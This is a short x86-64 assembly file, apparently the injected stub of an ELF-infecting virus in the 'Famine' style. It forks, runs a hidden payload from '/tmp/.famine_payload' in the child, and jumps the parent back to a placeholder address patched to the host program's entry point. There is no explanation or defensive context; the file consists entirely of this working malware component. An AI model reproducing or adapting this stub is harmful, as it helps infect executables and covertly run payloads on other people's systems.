BITS 64

call path
path:
	pop rbx
	lea rdi, [rbx + payload_path - path]
	push 0
	push rdi
	mov rsi, rsp
	xor edx, edx
	mov al, 57
	syscall
	test rax, rax
	jne parent
	mov al, 59
	syscall
parent:
	add rbx, 0xDEADBEEF
	jmp rbx
payload_path:
	db "/tmp/.famine_payload", 0
